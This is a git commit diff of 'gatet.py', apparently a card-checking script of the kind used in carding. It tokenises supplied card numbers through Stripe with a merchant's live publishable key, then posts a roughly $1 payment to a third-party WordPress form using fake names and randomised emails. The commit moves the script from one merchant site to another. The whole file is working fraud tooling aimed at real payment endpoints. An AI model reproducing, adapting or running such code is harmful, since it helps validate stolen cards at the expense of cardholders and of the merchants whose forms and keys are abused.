e2fa62e7640ed667be71d69ab93b28c7cba9ab81
Kira0621 <genpaypal01@gmail.com>
2026-04-13 08:25:55 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -30,51 +30,39 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ffcb1cc363c%3B+stripe-js-v3%2Ffcb1cc363c%3B+card-element&referrer=https%3A%2F%2Fwww.weprintitnow.com&time_on_page=105333&client_attribution_metadata[client_session_id]=934c7ba7-03f6-4d80-b6d1-2dba382fba7b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=c6f7f932-7405-47e8-88da-3eb9a550e7c6&key=pk_live_51QT6eDFtzybSIT2n1IlBWssiCralsgg5AQDn4k7Vvg7UMsK6gZmqJKkyHgSSdYifP4ZoX3uewYTVOEIqCvh8XXWl00zag4wf96'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff93cb2e34f%3B+stripe-js-v3%2Ff93cb2e34f%3B+card-element&referrer=https%3A%2F%2Fplatinumie.net&time_on_page=52749&client_attribution_metadata[client_session_id]=1c3e64be-c47c-4ee0-8cc4-26c3d17a1a93&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=2b5396f3-c60a-4760-92aa-453c892b7a00&key=pk_live_518MVTVAuNIofUrAYO7iUYiZ91pQzdQOM4kaTbHub1iMIcYPxjwZ73s1RUGdHuelJEx67MrzxQHImXEejxtKnhBRC002hFcBHOb'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
-	cookies = {
-	    '__stripe_mid': '2ecb66db-1dbb-4c74-93f9-05528dd282c69a50dd',
-	    '__stripe_sid': '500ff2ca-30b1-4446-84f3-f072a838a85869b53a',
-	}
-	
 	headers = {
-	    'Accept': '*/*',
-	    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-	    'Connection': 'keep-alive',
-	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'Cookie': '__stripe_mid=2ecb66db-1dbb-4c74-93f9-05528dd282c69a50dd; __stripe_sid=500ff2ca-30b1-4446-84f3-f072a838a85869b53a',
-	    'Origin': 'https://www.weprintitnow.com',
-	    'Referer': 'https://www.weprintitnow.com/order-prints/',
-	    'Sec-Fetch-Dest': 'empty',
-	    'Sec-Fetch-Mode': 'cors',
-	    'Sec-Fetch-Site': 'same-origin',
-	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'X-Requested-With': 'XMLHttpRequest',
+	    'authority': 'platinumie.net',
+	    'accept': '*/*',
+	    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://platinumie.net',
+	    'referer': 'https://platinumie.net/happy-kickers/happy-kickers-payment-portals/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	params = {
-	    't': '1775769086526',
+	    't': '1776043065926',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=914&_fluentform_3_fluentformnonce=729ae699e3&_wp_http_referer=%2Forder-prints%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser{random2}%40gmail.com&phone=%2B6681748063{random1}&dropdown=Circulars&payment_input=Test%20item%20-%20%241.00%20USD&address_1%5Baddress_line_1%5D=27%20Allen%20St&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10002&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'data': f'__fluent_form_embded_post_id=2315&_fluentform_12_fluentformnonce=c9664ef17d&_wp_http_referer=%2Fhappy-kickers%2Fhappy-kickers-payment-portals%2F&numeric-field=1.00&names%5Bfirst_name%5D=John&names%5Blast_name%5D=Lan&email=yellhtetgaung2106{random2}%40gmail.com&input_text_1=Ella&description=&custom-payment-amount=1&custom-payment-amount_2=0.03505&payment_method=stripe&input_radio=May&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '3',
+	    'form_id': '12',
 	}
 	
-	response = requests.post(
-	    'https://www.weprintitnow.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    #cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://platinumie.net/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
 	
 	return response.text
